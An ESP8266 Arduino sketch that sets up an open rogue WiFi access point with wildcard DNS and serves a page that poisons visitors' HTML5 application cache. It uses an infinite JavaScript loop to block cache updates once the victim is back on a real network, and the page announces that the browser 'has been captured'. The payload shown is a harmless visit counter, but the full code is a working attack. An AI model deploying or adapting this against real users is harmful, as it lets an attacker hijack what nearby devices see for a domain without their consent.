#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <FS.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress redirectIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String files[] = {
  // index.html
  "<html manifest=\"manifest.appcache\">\n"
  "<head>\n"
  "  <style>\n"
  "    body {\n"
  "      font-family: monospace;\n"
  "      text-align: center;\n"
  "      margin: 0px;\n"
  "    }\n"
  "    h1 {\n"
  "      font-size: 8vmin;\n"
  "      margin-top: 0.5em;\n"
  "    }\n"
  "    #count {\n"
  "      background-color: black;\n"
  "      color: white;\n"
  "      font-weight: bold;\n"
  "      font-size: 20vmin;\n"
  "      height: 1em;\n"
  "      padding: 0.2em;\n"
  "    }\n"
  "    .msg {\n"
  "      font-size: 6vmin;\n"
  "      margin-top: 0.4em;\n"
  "    }\n"
  "    #cherish {\n"
  "      margin-top: 1em;\n"
  "      font-size: 3vmin;\n"
  "    }\n"
  "    #explanation {\n"
  "      max-width: 600px;\n"
  "      margin-left: auto;\n"
  "      margin-right: auto;\n"
  "    }\n"
  "  </style>\n"
  "  <title>Captivating Portal</title>\n"
  "</head>\n"
  "<body>\n"
  "  <h1>Welcome to Captivating Portal</h1>\n"
  "  <div class=\"msg\">This is the</div>\n"
  "  <script>\n"
  "    var c = localStorage.getItem('count')\n"
  "    document.write('<div id=\"count\">'+(c||'')+'</div>')\n"
  "  </script>\n"
  "  <div class=\"msg\">browser to be captivated.</div>\n"
  "  <div id=\"cherish\">\n"
  "    Cherish this captive portal. Keep it with you always.\n"
  "  </div>\n"
  "  <br>\n"
  "  <div id=\"explanation\">\n"
  "    Your browser has been captured. You will see this page whenever you try to visit this domain, even if you are on a different network.\n"
  "    This attack works via the following hacks:\n"
  "    <ul>\n"
  "      <li>HTML5 Application Cache updates prevented via an infinite Javascript loop</li>\n"
  "      <li>WiFi devices don't authenticate the access points they connect to, so you connected to ours automatically</li>\n"
  "    </ul>\n"
  "  </div>\n"
  "  <script src=\"script.js\"></script>\n"
  "</body>\n"
  "</html>\n"
  "\n",

  // script.js
    "function getCount () {\n"
  "  var req = request('/count.txt')\n"
  "  if (req.status === 200) {\n"
  "    var stndrdth = /1.$/.test(req.responseText) ? 'th' : {\n"
  "      1: 'st', 2: 'nd', 3: 'rd'\n"
  "    }[req.responseText.substr(-1)] || 'th'\n"
  "    var nth = req.responseText + stndrdth\n"
  "    localStorage.setItem('count', nth)\n"
  "    count.textContent = nth\n"
  "  }\n"
  "}\n"
  "\n"
  "function preventUpdate () {\n"
  "  console.log('checking if we are on a real network')\n"
  "  var req = request('/check.txt')\n"
  "  if (req.status === 200) {\n"
  "    console.log('not on real network')\n"
  "    return\n"
  "  }\n"
  "\n"
  "  console.log('on real network, preventing future appcache checks')\n"
  "  window.applicationCache.addEventListener('checking', function (e) {\n"
  "    console.log('preventing appcache check')\n"
  "    while (true) {}\n"
  "  }, false)\n"
  "}\n"
  "\n"
  "function request (url) {\n"
  "  var req = new XMLHttpRequest()\n"
  "  req.open('GET', url, false)\n"
  "  req.send(null)\n"
  "  return req\n"
  "}\n"
  "\n"
  "getCount()\n"
  "preventUpdate()\n"
  "\n",

  // manifest.appcache
  "CACHE MANIFEST\n"
  "/\n"
  "/manifest.appcache\n"
  "/script.js\n"
  "/count.txt\n"
  "\n"
  "NETWORK:\n"
  "/check.txt\n"
  "\n"
};

int count = 0;

void setup () {
  Serial.begin(115200);
  SPIFFS.begin();
  File countFile = SPIFFS.open("count.txt", "r");
  if (countFile) {
    count = countFile.parseInt();
    countFile.close();
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
//  WiFi.softAP("ToorCampStatic", "toorcamp2016");
  WiFi.softAP("DNSServer CaptivePortal example");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", redirectIP);

  webServer.on("/manifest.appcache", []() {
    webServer.send(200, "text/cache-manifest", files[2]);
  });
  webServer.on("/check.html", []() {
    webServer.send(200, "text/plain", "\n");
  });
  webServer.on("/script.js", []() {
    webServer.send(200, "application/javascript", files[1]);
  });
  webServer.on("/count.txt", []() {
    webServer.send(200, "text/plain", String(++count));
    setCount(count);
  });
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", files[0]);
  });
  webServer.begin();
}

void loop () {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void setCount (int count) {
  File countFile = SPIFFS.open("count.txt", "w");
  countFile.println(count);
  countFile.close();
}
